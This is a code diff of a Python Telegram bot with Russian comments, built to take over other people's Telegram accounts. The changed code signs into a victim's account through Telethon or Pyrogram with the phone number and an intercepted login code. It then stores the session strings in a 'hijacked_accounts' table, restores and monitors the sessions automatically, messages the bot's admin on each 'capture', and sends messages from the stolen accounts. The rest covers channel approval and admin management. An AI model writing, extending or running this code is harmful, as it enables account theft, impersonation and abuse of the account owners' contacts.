-                        VALUES (?, ?, ?, ?, ?)
-                    ''', (
-                        phone,
-                        dialog.id,
-                        dialog.name or dialog.title,
-                        'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
-                        dialog.message.text[:100] if dialog.message else ''
-                    ))
-                
-                self.conn.commit()
-                
-            except Exception as e:
-                logger.error(f"[HIJACK] Ошибка получения дополнительной информации: {e}")
+            # Сохраняем сессию в памяти
+            self.active_sessions[account_id] = {
+                'phone': phone_number,
+                'session_string': session_string,
+                'session_type': 'telethon',
+                'client': client,
+                'last_used': datetime.now(),
+                'is_connected': True
+            }
             
-            await client.disconnect()
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (user_id, action, details, risk_level)
+                VALUES (?, ?, ?, ?)
+            ''', (
+                me.id,
+                'account_hijack',
+                f'Telegram аккаунт захвачен: {phone_number}',
+                10
+            ))
             
-            # Логируем успех
-            self.cursor.execute(
-                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-                (phone, "telethon_hijack", "success")
-            )
-            self.conn.commit()
+            logger.info(f"Аккаунт {phone_number} успешно захвачен (ID: {account_id})")
             
-            return session_string
+            return {
+                'success': True,
+                'account_id': account_id,
+                'user_id': me.id,
+                'username': me.username,
+                'first_name': me.first_name,
+                'session_type': 'telethon'
+            }
             
         except Exception as e:
-            logger.error(f"[HIJACK] Критическая ошибка при захвате аккаунта {phone}: {e}")
-            
-            self.cursor.execute(
-                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-                (phone, "telethon_hijack_error", str(e)[:200])
-            )
-            self.conn.commit()
-            
-            return None
+            logger.error(f"Ошибка Telethon для {phone_number}: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'account_id': None
+            }
     
-    async def hijack_account_pyrogram(self, phone: str, code: str) -> str:
-        """Альтернативный метод через Pyrogram"""
+    async def _hijack_with_pyrogram(self, phone_number: str, code: str) -> Dict:
+        """Захватывает аккаунт через Pyrogram"""
         try:
-            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Pyrogram...")
-            
             app = Client(
-                name=f"session_{phone}",
-                api_id=self.api_id,
-                api_hash=self.api_hash,
-                phone_number=phone,
+                name=f"session_{phone_number}",
+                api_id=config.TELEGRAM_API_ID,
+                api_hash=config.TELEGRAM_API_HASH,
+                phone_number=phone_number,
                 in_memory=True
             )
             
             await app.connect()
             
             # Отправляем код
-            sent_code = await app.send_code(phone)
-            logger.info(f"[HIJACK] Код отправлен на {phone}")
+            sent_code = await app.send_code(phone_number)
             
             # Входим
-            try:
-                await app.sign_in(
-                    phone_number=phone,
-                    phone_code_hash=sent_code.phone_code_hash,
-                    phone_code=code
-                )
-            except Exception as e:
-                logger.error(f"[HIJACK] Ошибка входа Pyrogram: {e}")
-                return None
+            await app.sign_in(
+                phone_number=phone_number,
+                phone_code_hash=sent_code.phone_code_hash,
+                phone_code=code
+            )
             
             # Получаем сессию
             session_string = await app.export_session_string()
@@ -323,2234 +821,2663 @@ class TelegramAccountHijacker:
             # Получаем информацию
             me = await app.get_me()
             
-            # Сохраняем
-            self.cursor.execute('''
-                INSERT OR REPLACE INTO hijacked_sessions 
-                (phone, user_id, username, first_name, session_string, hijacked_at, method, is_active)
-                VALUES (?, ?, ?, ?, ?, ?, 'pyrogram', ?)
+            # Сохраняем в базу
+            session_encrypted = encryptor.encrypt(session_string)
+            phone_hash = encryptor.hash_data(phone_number)
+            
+            db.execute('''
+                INSERT OR REPLACE INTO hijacked_accounts 
+                (phone_number, phone_hash, user_id, username, first_name, last_name, 
+                 session_string_encrypted, session_type, hijacked_date, is_active)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
             ''', (
-                phone,
+                phone_number,
+                phone_hash,
                 me.id,
                 me.username,
                 me.first_name,
-                session_string,
+                me.last_name or '',
+                session_encrypted,
+                'pyrogram',
                 datetime.now().isoformat(),
                 1
             ))
-            self.conn.commit()
             
-            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен через Pyrogram: @{me.username}")
+            account_id = db.cursor.lastrowid
             
-            await app.disconnect()
+            # Сохраняем сессию
+            self.active_sessions[account_id] = {
+                'phone': phone_number,
+                'session_string': session_string,
+                'session_type': 'pyrogram',
+                'client': app,
+                'last_used': datetime.now(),
+                'is_connected': True
+            }
             
-            # Логируем успех
-            self.cursor.execute(
-                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-                (phone, "pyrogram_hijack", "success")
-            )
-            self.conn.commit()
+            logger.info(f"Аккаунт {phone_number} захвачен через Pyrogram (ID: {account_id})")
             
-            return session_string
-            
-        except Exception as e:
-            logger.error(f"[HIJACK] Ошибка Pyrogram для {phone}: {e}")
-            
-            self.cursor.execute(
-                "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-                (phone, "pyrogram_hijack_error", str(e)[:200])
-            )
-            self.conn.commit()
-            
-            return None
-    
-    async def check_account_access(self, session_string: str) -> bool:
-        """Проверяем доступ к аккаунту"""
-        try:
-            client = TelegramClient(
-                session=StringSession(session_string),
-                api_id=self.api_id,
-                api_hash=self.api_hash
-            )
-            
-            await client.connect()
-            
-            if not await client.is_user_authorized():
-                logger.warning(f"[HIJACK] Сессия не авторизована")
-                await client.disconnect()
-                return False
-            
-            me = await client.get_me()
-            logger.info(f"[HIJACK] Аккаунт доступен: @{me.username}")
-            
-            await client.disconnect()
-            return True
+            return {
+                'success': True,
+                'account_id': account_id,
+                'user_id': me.id,
+                'username': me.username,
+                'first_name': me.first_name,
+                'session_type': 'pyrogram'
+            }
             
         except Exception as e:
-            logger.error(f"[HIJACK] Ошибка проверки доступа: {e}")
-            return False
+            logger.error(f"Ошибка Pyrogram для {phone_number}: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'account_id': None
+            }
     
-    async def send_message_from_hijacked(self, phone: str, target: str, message: str) -> bool:
+    async def send_message_from_account(self, account_id: int, target: str, message: str, 
+                                       media_path: str = None) -> Dict:
         """Отправляет сообщение от захваченного аккаунта"""
         try:
-            # Получаем сессию из базы
-            self.cursor.execute(
-                "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
-                (phone,)
-            )
-            result = self.cursor.fetchone()
+            if account_id not in self.active_sessions:
+                # Пытаемся восстановить сессию
+                await self.restore_session(account_id)
             
-            if not result:
-                logger.error(f"[HIJACK] Сессия для {phone} не найдена или неактивна")
-                return False
+            session_info = self.active_sessions.get(account_id)
+            if not session_info:
+                return {'success': False, 'error': 'Сессия не найдена'}
             
-            session_string = result[0]
-            
-            client = TelegramClient(
-                session=StringSession(session_string),
-                api_id=self.api_id,
-                api_hash=self.api_hash
-            )
-            
-            await client.connect()
+            client = session_info['client']
+            if not client or not session_info['is_connected']:
+                # Восстанавливаем подключение
+                client = await self.restore_session(account_id)
             
             # Отправляем сообщение
-            await client.send_message(target, message)
-            logger.info(f"[HIJACK] Сообщение отправлено от {phone} к {target}")
+            if media_path and os.path.exists(media_path):
+                # Отправляем с медиа
+                if session_info['session_type'] == 'telethon':
+                    await client.send_file(target, media_path, caption=message)
+                else:
+                    await client.send_photo(target, media_path, caption=message)
+            else:
+                # Отправляем текстовое сообщение
+                await client.send_message(target, message)
             
-            await client.disconnect()
+            # Обновляем время использования
+            session_info['last_used'] = datetime.now()
             
             # Логируем действие
-            self.cursor.execute(
-                "INSERT INTO account_actions (phone, action_type, target, message, status, executed_at) VALUES (?, ?, ?, ?, ?, ?)",
-                (phone, "send_message", target, message[:100], "success", datetime.now().isoformat())
+            db.execute('''
+                INSERT INTO account_actions 
+                (account_id, action_type, target, data, status, executed_date, result)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                account_id,
+                'send_message',
+                target,
+                message[:100],
+                'success',
+                datetime.now().isoformat(),
+                'Сообщение отправлено'
+            ))
+            
+            return {'success': True, 'message': 'Сообщение отправлено'}
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки сообщения от аккаунта {account_id}: {e}")
+            
+            db.execute('''
+                INSERT INTO account_actions 
+                (account_id, action_type, target, data, status, error_message)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (
+                account_id,
+                'send_message',
+                target,
+                message[:100],
+                'failed',
+                str(e)[:200]
+            ))
+            
+            return {'success': False, 'error': str(e)}
+    
+    async def restore_session(self, account_id: int):
+        """Восстанавливает сессию аккаунта"""
+        try:
+            # Получаем данные из базы
+            account_data = db.fetch_one(
+                "SELECT session_string_encrypted, session_type, phone_number FROM hijacked_accounts WHERE id = ?",
+                (account_id,)
             )
-            self.conn.commit()
+            
+            if not account_data:
+                raise ValueError(f"Аккаунт {account_id} не найден")
+            
+            session_encrypted, session_type, phone = account_data
+            session_string = encryptor.decrypt(session_encrypted)
+            
+            client = None
+            
+            if session_type == 'telethon':
+                client = TelegramClient(
+                    session=StringSession(session_string),
+                    api_id=config.TELEGRAM_API_ID,
+                    api_hash=config.TELEGRAM_API_HASH
+                )
+                await client.connect()
+                
+                # Проверяем авторизацию
+                if not await client.is_user_authorized():
+                    raise ValueError("Сессия не авторизована")
+                    
+            elif session_type == 'pyrogram':
+                client = Client(
+                    name=f"restored_{phone}",
+                    api_id=config.TELEGRAM_API_ID,
+                    api_hash=config.TELEGRAM_API_HASH,
+                    session_string=session_string
+                )
+                await client.connect()
+            
+            # Обновляем в памяти
+            if account_id in self.active_sessions:
+                self.active_sessions[account_id].update({
+                    'client': client,
+                    'is_connected': True,
+                    'last_used': datetime.now()
+                })
+            else:
+                self.active_sessions[account_id] = {
+                    'phone': phone,
+                    'session_string': session_string,
+                    'session_type': session_type,
+                    'client': client,
+                    'last_used': datetime.now(),
+                    'is_connected': True
+                }
+            
+            logger.info(f"Сессия аккаунта {account_id} восстановлена")
+            return client
+            
+        except Exception as e:
+            logger.error(f"Ошибка восстановления сессии {account_id}: {e}")
+            
+            # Помечаем аккаунт как неактивный
+            db.execute(
+                "UPDATE hijacked_accounts SET is_active = 0, last_check = ? WHERE id = ?",
+                (datetime.now().isoformat(), account_id)
+            )
+            
+            if account_id in self.active_sessions:
+                del self.active_sessions[account_id]
+            
+            raise
+    
+    async def get_account_info(self, account_id: int) -> Dict:
+        """Получает информацию об аккаунте"""
+        try:
+            if account_id not in self.active_sessions:
+                await self.restore_session(account_id)
+            
+            session_info = self.active_sessions[account_id]
+            client = session_info['client']
+            
+            if session_info['session_type'] == 'telethon':
+                me = await client.get_me()
+                dialogs = await client.get_dialogs(limit=10)
+                
+                return {
+                    'user_id': me.id,
+                    'username': me.username,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name,
+                    'phone': session_info['phone'],
+                    'dialogs_count': len(dialogs),
+                    'is_online': await client.is_user_authorized(),
+                    'session_type': 'telethon'
+                }
+            else:
+                me = await client.get_me()
+                
+                return {
+                    'user_id': me.id,
+                    'username': me.username,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name or '',
+                    'phone': session_info['phone'],
+                    'is_online': True,
+                    'session_type': 'pyrogram'
+                }
+                
+        except Exception as e:
+            logger.error(f"Ошибка получения информации об аккаунте {account_id}: {e}")
+            return {'error': str(e)}
+    
+    def get_all_accounts(self) -> List[Dict]:
+        """Возвращает список всех аккаунтов"""
+        accounts = db.fetch_all('''
+            SELECT id, phone_number, username, first_name, hijacked_date, is_active 
+            FROM hijacked_accounts 
+            ORDER BY hijacked_date DESC
+        ''')
+        
+        result = []
+        for acc in accounts:
+            result.append({
+                'id': acc[0],
+                'phone': acc[1],
+                'username': acc[2],
+                'first_name': acc[3],
+                'hijacked_date': acc[4],
+                'is_active': bool(acc[5]),
+                'in_memory': acc[0] in self.active_sessions
+            })
+        
+        return result
+
+account_manager = TelegramAccountManager()
+
+# ========== СИСТЕМА АВТОМАТИЧЕСКОГО ВХОДА ==========
+class AutoLoginSystem:
+    """Система автоматического входа и мониторинга аккаунтов"""
+    
+    def __init__(self):
+        self.monitoring_tasks = {}
+        self.login_queue = asyncio.Queue()
+        self.is_running = False
+    
+    async def start_monitoring(self):
+        """Запускает мониторинг всех аккаунтов"""
+        if self.is_running:
+            return
+        
+        self.is_running = True
+        logger.info("Запуск системы мониторинга аккаунтов")
+        
+        # Запускаем обработчик очереди
+        asyncio.create_task(self._process_login_queue())
+        
+        # Запускаем периодические проверки
+        asyncio.create_task(self._periodic_account_checks())
+        
+        # Восстанавливаем все сессии
+        await self.restore_all_sessions()
+    
+    async def restore_all_sessions(self):
+        """Восстанавливает все сохраненные сессии"""
+        try:
+            accounts = db.fetch_all("SELECT id FROM hijacked_accounts WHERE is_active = 1")
+            
+            logger.info(f"Восстановление {len(accounts)} сессий...")
+            
+            for account in accounts:
+                account_id = account[0]
+                try:
+                    await account_manager.restore_session(account_id)
+                    await asyncio.sleep(1)  # Задержка между восстановлениями
+                except Exception as e:
+                    logger.warning(f"Не удалось восстановить сессию {account_id}: {e}")
+            
+            logger.info("Восстановление сессий завершено")
+            
+        except Exception as e:
+            logger.error(f"Ошибка восстановления сессий: {e}")
+    
+    async def _process_login_queue(self):
+        """Обрабатывает очередь автоматического входа"""
+        while self.is_running:
+            try:
+                task = await self.login_queue.get()
+                
+                if task['type'] == 'hijack':
+                    await self._auto_hijack_account(
+                        task['phone'],
+                        task['code'],
+                        task.get('method', 'telethon')
+                    )
+                elif task['type'] == 'restore':
+                    await account_manager.restore_session(task['account_id'])
+                
+                self.login_queue.task_done()
+                
+            except Exception as e:
+                logger.error(f"Ошибка обработки задачи входа: {e}")
+                await asyncio.sleep(5)
+    
+    async def _auto_hijack_account(self, phone: str, code: str, method: str):
+        """Автоматический захват аккаунта"""
+        try:
+            result = await account_manager.hijack_account(phone, code, method)
+            
+            if result['success']:
+                # Уведомляем главного админа
+                await bot.send_message(
+                    config.MAIN_ADMIN_ID,
+                    f"✅ <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ УСПЕШЕН</b>\n\n"
+                    f"📱 Телефон: {phone}\n"
+                    f"👤 Пользователь: @{result.get('username', 'нет')}\n"
+                    f"🆔 ID аккаунта: {result['account_id']}\n"
+                    f"🔧 Метод: {method}\n"
+                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+                    parse_mode="HTML"
+                )
+                
+                # Запускаем мониторинг для этого аккаунта
+                asyncio.create_task(self._monitor_account(result['account_id']))
+            else:
+                logger.error(f"Авто-захват не удался: {result['error']}")
+                
+        except Exception as e:
+            logger.error(f"Ошибка авто-захвата: {e}")
+    
+    async def _monitor_account(self, account_id: int):
+        """Мониторинг состояния аккаунта"""
+        try:
+            while self.is_running and account_id in account_manager.active_sessions:
+                try:
+                    # Проверяем доступность аккаунта
+                    info = await account_manager.get_account_info(account_id)
+                    
+                    if 'error' in info:
+                        # Пробуем восстановить
+                        await account_manager.restore_session(account_id)
+                    
+                    # Обновляем статус в базе
+                    db.execute(
+                        "UPDATE hijacked_accounts SET last_check = ?, is_online = ? WHERE id = ?",
+                        (datetime.now().isoformat(), 1, account_id)
+                    )
+                    
+                    await asyncio.sleep(300)  # Проверка каждые 5 минут
+                    
+                except Exception as e:
+                    logger.warning(f"Ошибка мониторинга аккаунта {account_id}: {e}")
+                    await asyncio.sleep(60)
+                    
+        except Exception as e:
+            logger.error(f"Мониторинг аккаунта {account_id} остановлен: {e}")
+    
+    async def _periodic_account_checks(self):
+        """Периодические проверки всех аккаунтов"""
+        while self.is_running:
+            try:
+                # Получаем список аккаунтов для проверки
+                accounts = db.fetch_all('''
+                    SELECT id FROM hijacked_accounts 
+                    WHERE is_active = 1 
+                    AND (last_check IS NULL OR last_check < ?)
+                ''', ((datetime.now() - timedelta(hours=1)).isoformat(),))
+                
+                for account in accounts:
+                    account_id = account[0]
+                    try:
+                        await account_manager.restore_session(account_id)
+                        await asyncio.sleep(2)
+                    except Exception as e:
+                        logger.warning(f"Периодическая проверка не удалась для {account_id}: {e}")
+                
+                await asyncio.sleep(1800)  # Проверка каждые 30 минут
+                
+            except Exception as e:
+                logger.error(f"Ошибка периодической проверки: {e}")
+                await asyncio.sleep(300)
+    
+    async def stop_monitoring(self):
+        """Останавливает мониторинг"""
+        self.is_running = False
+        logger.info("Мониторинг аккаунтов остановлен")
+
+auto_login_system = AutoLoginSystem()
+
+# ========== МЕНЕДЖЕР КАНАЛОВ И ГРУПП ==========
+class ChannelManager:
+    """Управление каналами и группами"""
+    
+    async def add_channel(self, channel_id: str, added_by: int, channel_info: Dict = None) -> Dict:
+        """Добавляет канал/группу в систему"""
+        try:
+            # Проверяем, существует ли уже канал
+            existing = db.fetch_one(
+                "SELECT id FROM channels WHERE channel_id = ?",
+                (channel_id,)
+            )
+            
+            if existing:
+                return {
+                    'success': False,
+                    'error': 'Канал уже добавлен',
+                    'channel_id': existing[0]
+                }
+            
+            # Получаем информацию о канале
+            if not channel_info:
+                try:
+                    chat = await bot.get_chat(channel_id)
+                    channel_info = {
+                        'title': chat.title,
+                        'username': chat.username,
+                        'type': str(chat.type)
+                    }
+                except Exception as e:
+                    logger.warning(f"Не удалось получить информацию о канале: {e}")
+                    channel_info = {
+                        'title': f'Канал {channel_id}',
+                        'username': None,
+                        'type': 'unknown'
+                    }
+            
+            # Проверяем, является ли бот администратором
+            bot_is_admin = False
+            bot_permissions = {}
+            
+            try:
+                member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
+                if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
+                    bot_is_admin = True
+                    
+                    if member.status == ChatMemberStatus.ADMINISTRATOR:
+                        bot_permissions = {
+                            'can_post_messages': member.can_post_messages or False,
+                            'can_edit_messages': member.can_edit_messages or False,
+                            'can_delete_messages': member.can_delete_messages or False,
+                            'can_restrict_members': member.can_restrict_members or False,
+                            'can_promote_members': member.can_promote_members or False,
+                            'can_change_info': member.can_change_info or False,
+                            'can_invite_users': member.can_invite_users or False,
+                            'can_pin_messages': member.can_pin_messages or False,
+                            'can_manage_chat': member.can_manage_chat or False,
+                            'can_manage_video_chats': member.can_manage_video_chats or False
+                        }
+            except Exception as e:
+                logger.warning(f"Не удалось проверить права бота в канале: {e}")
+            
+            # Добавляем канал в базу
+            db.execute('''
+                INSERT INTO channels 
+                (channel_id, channel_title, channel_username, channel_type, added_by,
+                 is_approved, notifications_enabled, admin_notifications, bot_is_admin, bot_permissions)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                channel_id,
+                channel_info['title'],
+                channel_info['username'],
+                channel_info['type'],
+                added_by,
+                0,  # Не одобрен по умолчанию
+                1,  # Уведомления включены
+                1,  # Уведомления админу включены
+                bot_is_admin,
+                json.dumps(bot_permissions)
+            ))
+            
+            channel_db_id = db.cursor.lastrowid
+            
+            # Отправляем уведомление главному админу
+            if added_by != config.MAIN_ADMIN_ID:
+                keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                    [
+                        InlineKeyboardButton(
+                            text="✅ Одобрить",
+                            callback_data=f"approve_channel:{channel_db_id}"
+                        ),
+                        InlineKeyboardButton(
+                            text="❌ Отклонить", 
+                            callback_data=f"reject_channel:{channel_db_id}"
+                        )
+                    ],
+                    [
+                        InlineKeyboardButton(
+                            text="👁️ Просмотр", 
+                            callback_data=f"view_channel:{channel_db_id}"
+                        )
+                    ]
+                ])
+                
+                await bot.send_message(
+                    config.MAIN_ADMIN_ID,
+                    f"🆕 <b>НОВЫЙ КАНАЛ ДОБАВЛЕН</b>\n\n"
+                    f"📢 Название: {channel_info['title']}\n"
+                    f"🔗 ID: {channel_id}\n"
+                    f"👤 Добавил: {added_by}\n"
+                    f"🤖 Бот админ: {'✅ Да' if bot_is_admin else '❌ Нет'}\n\n"
+                    f"<i>Требуется одобрение для отправки уведомлений</i>",
+                    parse_mode="HTML",
+                    reply_markup=keyboard
+                )
+            
+            return {
+                'success': True,
+                'channel_id': channel_db_id,
+                'requires_approval': added_by != config.MAIN_ADMIN_ID,
+                'bot_is_admin': bot_is_admin
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка добавления канала: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def approve_channel(self, channel_db_id: int, approved_by: int) -> Dict:
+        """Одобряет канал для отправки уведомлений"""
+        try:
+            # Получаем информацию о канале
+            channel_data = db.fetch_one(
+                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            
+            if not channel_data:
+                return {'success': False, 'error': 'Канал не найден'}
+            
+            channel_id, channel_title, added_by = channel_data
+            
+            # Обновляем статус
+            db.execute('''
+                UPDATE channels 
+                SET is_approved = 1, approved_by = ?, approved_date = ?, admin_notifications = 0 
+                WHERE id = ?
+            ''', (approved_by, datetime.now().isoformat(), channel_db_id))
+            
+            # Уведомляем того, кто добавил канал
+            if added_by != approved_by:
+                try:
+                    await bot.send_message(
+                        added_by,
+                        f"✅ <b>ВАШ КАНАЛ ОДОБРЕН!</b>\n\n"
+                        f"📢 Канал: {channel_title}\n"
+                        f"🔗 ID: {channel_id}\n"
+                        f"👑 Одобрил: Главный админ\n\n"
+                        f"Теперь бот будет отправлять уведомления в этот канал.",
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (approved_by, 'channel_approved', f'Канал {channel_id} одобрен'))
+            
+            return {
+                'success': True,
+                'channel_id': channel_db_id,
+                'channel_title': channel_title,
+                'admin_notifications': False
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка одобрения канала: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def reject_channel(self, channel_db_id: int, rejected_by: int, reason: str = "") -> Dict:
+        """Отклоняет канал"""
+        try:
+            channel_data = db.fetch_one(
+                "SELECT channel_id, channel_title, added_by FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            
+            if not channel_data:
+                return {'success': False, 'error': 'Канал не найден'}
+            
+            channel_id, channel_title, added_by = channel_data
+            
+            # Удаляем канал из базы
+            db.execute("DELETE FROM channels WHERE id = ?", (channel_db_id,))
+            
+            # Уведомляем того, кто добавил канал
+            if added_by != rejected_by:
+                try:
+                    await bot.send_message(
+                        added_by,
+                        f"❌ <b>ВАШ КАНАЛ ОТКЛОНЕН!</b>\n\n"
+                        f"📢 Канал: {channel_title}\n"
+                        f"🔗 ID: {channel_id}\n"
+                        f"👑 Отклонил: Главный админ\n"
+                        f"📝 Причина: {reason or 'Не указана'}\n\n"
+                        f"Бот не будет отправлять уведомления в этот канал.",
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.warning(f"Не удалось уведомить пользователя {added_by}: {e}")
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (rejected_by, 'channel_rejected', f'Канал {channel_id} отклонен: {reason}'))
+            
+            return {'success': True, 'channel_id': channel_db_id}
+            
+        except Exception as e:
+            logger.error(f"Ошибка отклонения канала: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def toggle_channel_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
+        """Включает/выключает уведомления в канале"""
+        try:
+            # Если enabled не указан, переключаем на противоположное
+            if enabled is None:
+                current = db.fetch_one(
+                    "SELECT notifications_enabled FROM channels WHERE id = ?",
+                    (channel_db_id,)
+                )
+                if current:
+                    enabled = not bool(current[0])
+            
+            db.execute(
+                "UPDATE channels SET notifications_enabled = ? WHERE id = ?",
+                (1 if enabled else 0, channel_db_id)
+            )
+            
+            channel_data = db.fetch_one(
+                "SELECT channel_title FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            
+            return {
+                'success': True,
+                'channel_id': channel_db_id,
+                'notifications_enabled': enabled,
+                'channel_title': channel_data[0] if channel_data else 'Unknown'
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка переключения уведомлений: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def toggle_admin_notifications(self, channel_db_id: int, enabled: bool = None) -> Dict:
+        """Включает/выключает уведомления админу"""
+        try:
+            if enabled is None:
+                current = db.fetch_one(
+                    "SELECT admin_notifications FROM channels WHERE id = ?",
+                    (channel_db_id,)
+                )
+                if current:
+                    enabled = not bool(current[0])
+            
+            db.execute(
+                "UPDATE channels SET admin_notifications = ? WHERE id = ?",
+                (1 if enabled else 0, channel_db_id)
+            )
+            
+            channel_data = db.fetch_one(
+                "SELECT channel_title FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            
+            status = "включены" if enabled else "выключены"
+            
+            return {
+                'success': True,
+                'channel_id': channel_db_id,
+                'admin_notifications': enabled,
+                'status_text': f"Уведомления админу {status}"
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка переключения админ-уведомлений: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def send_to_channel(self, channel_db_id: int, message: str, 
+                            media_path: str = None, message_type: str = 'text') -> Dict:
+        """Отправляет сообщение в канал"""
+        try:
+            # Получаем информацию о канале
+            channel_data = db.fetch_one(
+                "SELECT channel_id, notifications_enabled, admin_notifications FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            
+            if not channel_data:
+                return {'success': False, 'error': 'Канал не найден'}
+            
+            channel_id, notifications_enabled, admin_notifications = channel_data
+            
+            # Если уведомления в канал выключены, отправляем админу
+            if not notifications_enabled:
+                if admin_notifications:
+                    await bot.send_message(
+                        config.MAIN_ADMIN_ID,
+                        f"🔕 <b>Сообщение для канала (уведомления выключены)</b>\n\n"
+                        f"{message}",
+                        parse_mode="HTML"
+                    )
+                    return {'success': True, 'sent_to_admin': True, 'sent_to_channel': False}
+                else:
+                    return {'success': False, 'error': 'Уведомления отключены'}
+            
+            # Отправляем в канал
+            try:
+                if media_path and os.path.exists(media_path):
+                    with open(media_path, 'rb') as f:
+                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
+                            sent_message = await bot.send_photo(
+                                channel_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                        elif media_path.lower().endswith('.mp4'):
+                            sent_message = await bot.send_video(
+                                channel_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                        else:
+                            sent_message = await bot.send_document(
+                                channel_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                else:
+                    sent_message = await bot.send_message(
+                        channel_id,
+                        message,
+                        parse_mode="HTML"
+                    )
+                
+                # Обновляем последнее сообщение
+                db.execute(
+                    "UPDATE channels SET last_message_id = ?, last_activity = ? WHERE id = ?",
+                    (sent_message.message_id, datetime.now().isoformat(), channel_db_id)
+                )
+                
+                return {
+                    'success': True,
+                    'message_id': sent_message.message_id,
+                    'sent_to_channel': True,
+                    'sent_to_admin': False
+                }
+                
+            except Exception as e:
+                logger.error(f"Ошибка отправки в канал {channel_id}: {e}")
+                
+                # Если не удалось отправить в канал, отправляем админу
+                if admin_notifications:
+                    await bot.send_message(
+                        config.MAIN_ADMIN_ID,
+                        f"⚠️ <b>Ошибка отправки в канал</b>\n\n"
+                        f"Канал: {channel_id}\n"
+                        f"Ошибка: {str(e)[:200]}\n\n"
+                        f"Сообщение: {message[:500]}",
+                        parse_mode="HTML"
+                    )
+                    return {'success': False, 'error': str(e), 'sent_to_admin': True}
+                else:
+                    return {'success': False, 'error': str(e)}
+                
+        except Exception as e:
+            logger.error(f"Ошибка отправки в канал: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def get_all_channels(self, filters: Dict = None) -> List[Dict]:
+        """Получает список всех каналов"""
+        try:
+            query = "SELECT id, channel_id, channel_title, channel_username, is_approved, notifications_enabled, admin_notifications, added_date FROM channels"
+            params = []
+            
+            if filters:
+                conditions = []
+                if filters.get('approved_only'):
+                    conditions.append("is_approved = 1")
+                if filters.get('active_only'):
+                    conditions.append("notifications_enabled = 1")
+                if filters.get('search'):
+                    conditions.append("(channel_title LIKE ? OR channel_username LIKE ?)")
+                    search_term = f"%{filters['search']}%"
+                    params.extend([search_term, search_term])
+                
+                if conditions:
+                    query += " WHERE " + " AND ".join(conditions)
+            
+            query += " ORDER BY added_date DESC"
+            
+            channels = db.fetch_all(query, params)
+            
+            result = []
+            for ch in channels:
+                result.append({
+                    'id': ch[0],
+                    'channel_id': ch[1],
+                    'title': ch[2],
+                    'username': ch[3],
+                    'is_approved': bool(ch[4]),
+                    'notifications_enabled': bool(ch[5]),
+                    'admin_notifications': bool(ch[6]),
+                    'added_date': ch[7]
+                })
+            
+            return result
+            
+        except Exception as e:
+            logger.error(f"Ошибка получения списка каналов: {e}")
+            return []
+
+channel_manager = ChannelManager()
+
+# ========== МЕНЕДЖЕР АДМИНИСТРАТОРОВ ==========
+class AdminManager:
+    """Управление администраторами системы"""
+    
+    def __init__(self):
+        self.admin_cache = {}
+        self.load_admins_cache()
+    
+    def load_admins_cache(self):
+        """Загружает администраторов в кэш"""
+        try:
+            admins = db.fetch_all(
+                "SELECT user_id, username, permissions, is_main_admin FROM admins WHERE is_active = 1"
+            )
+            
+            for admin in admins:
+                self.admin_cache[admin[0]] = {
+                    'username': admin[1],
+                    'permissions': admin[2],
+                    'is_main_admin': bool(admin[3])
+                }
+            
+            logger.info(f"Загружено {len(self.admin_cache)} администраторов в кэш")
+            
+        except Exception as e:
+            logger.error(f"Ошибка загрузки кэша администраторов: {e}")
+    
+    def is_admin(self, user_id: int) -> bool:
+        """Проверяет, является ли пользователь администратором"""
+        return user_id in self.admin_cache
+    
+    def is_main_admin(self, user_id: int) -> bool:
+        """Проверяет, является ли пользователь главным администратором"""
+        if user_id in self.admin_cache:
+            return self.admin_cache[user_id]['is_main_admin']
+        return False
+    
